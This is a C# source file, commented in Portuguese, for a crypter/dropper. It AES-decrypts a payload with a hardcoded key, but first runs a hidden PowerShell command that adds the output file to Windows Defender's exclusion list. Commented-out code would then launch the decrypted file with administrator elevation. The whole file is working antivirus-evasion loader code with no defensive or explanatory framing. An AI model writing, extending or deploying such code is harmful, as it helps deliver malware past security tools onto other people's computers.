using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Threading;

public class FileEncryptor2
{
    // Substitua as chaves e IVs a seguir com valores gerados aleatoriamente e mantenha-os em segurança.
    private byte[] key = new byte[]
    {
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
        0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10,
        0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18,
        0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20
    };

    private byte[] iv = new byte[]
    {
        0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28,
        0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F, 0x30
    };

    public void EncryptFile(string inputFile, string outputFile)
    {
        using (Aes aesAlg = Aes.Create())
        {
            aesAlg.Key = key;
            aesAlg.IV = iv;

            using (FileStream fsInput = new FileStream(inputFile, FileMode.Open, FileAccess.Read))
            using (FileStream fsOutput = new FileStream(outputFile, FileMode.Create, FileAccess.Write))
            using (ICryptoTransform encryptor = aesAlg.CreateEncryptor())
            using (CryptoStream cryptoStream = new CryptoStream(fsOutput, encryptor, CryptoStreamMode.Write))
            {
                byte[] buffer = new byte[4096];
                int bytesRead;

                while ((bytesRead = fsInput.Read(buffer, 0, buffer.Length)) > 0)
                {
                    cryptoStream.Write(buffer, 0, bytesRead);
                }
            }
        }
    }

    // Método para adicionar o arquivo descriptografado à lista de exclusões do Windows Defender
    private bool AddToWindowsDefenderExclusions(string filePath)
    {
        bool success = false;

        using (Process process = new Process())
        {
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "powershell",
                RedirectStandardOutput = true,
                RedirectStandardInput = true,  // Habilita o redirecionamento da entrada padrão
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            process.StartInfo = psi;
            process.Start();

            // Execute o comando no PowerShell
            string command = $"Add-MpPreference -ExclusionPath \"{filePath}\"";

            // Escreva o comando no StandardInput
            process.StandardInput.WriteLine(command);
            process.StandardInput.Close(); // Feche a entrada padrão

            // Capture a saída e os erros do PowerShell
            string output = process.StandardOutput.ReadToEnd();
            string errors = process.StandardError.ReadToEnd();

            // Se não houver erros, consideramos que foi bem-sucedido
            if (string.IsNullOrWhiteSpace(errors))
            {
                success = true;
            }

            // Registre ou manipule a saída e os erros aqui
            Console.WriteLine("Saída do PowerShell: " + output);
            Console.WriteLine("Erros do PowerShell: " + errors);

            process.WaitForExit();
        }

        return success;
    }

    public void DecryptFile(string inputFile, string outputFile)
    {
        // Adicione o arquivo às exclusões do Windows Defender
        if (AddToWindowsDefenderExclusions(outputFile))
        {
            // Espera por 10 segundos (10.000 milissegundos = 10 segundos)
            Thread.Sleep(10000);

            // Se a adição às exclusões foi bem-sucedida, prossiga com a descriptografia
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = iv;

                using (FileStream fsInput = new FileStream(inputFile, FileMode.Open, FileAccess.Read))
                using (FileStream fsOutput = new FileStream(outputFile, FileMode.Create, FileAccess.Write))
                using (ICryptoTransform decryptor = aesAlg.CreateDecryptor())
                using (CryptoStream cryptoStream = new CryptoStream(fsOutput, decryptor, CryptoStreamMode.Write))
                {
                    byte[] buffer = new byte[4096];
                    int bytesRead;

                    while ((bytesRead = fsInput.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        cryptoStream.Write(buffer, 0, bytesRead);
                    }
                }
            }

            // Espera por 10 segundos (10.000 milissegundos = 10 segundos)
            Thread.Sleep(10000);

            // Execute o arquivo descriptografado como administrador
            //ProcessStartInfo psi = new ProcessStartInfo
            //{
            //FileName = outputFile,
            //Verb = "runas" // Solicitar elevação para administrador
            //};
            //Process.Start(psi);
            Console.WriteLine("Colocado dno defender");
        }
        else
        {
            Console.WriteLine("Falha ao adicionar o arquivo às exclusões do Windows Defender.");
        }
    }

}
